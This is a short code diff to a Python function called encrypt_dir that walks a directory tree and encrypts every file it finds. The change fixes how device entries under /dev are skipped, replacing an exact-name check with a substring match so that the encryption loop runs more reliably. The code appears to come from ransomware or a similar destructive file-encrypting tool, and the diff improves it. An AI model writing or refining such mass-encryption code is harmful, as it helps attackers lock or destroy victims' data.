@@ -69,7 +69,7 @@ def encrypt_dir(directory, key):
             path = root + '/' + file
             try:
                 if '/dev' in path[:3]:
-                    if file not in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout'):
+                    if not any(substring in file for substring in ('dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout')):
                         encrypt(path, key)
                 else:
                     encrypt(path, key)
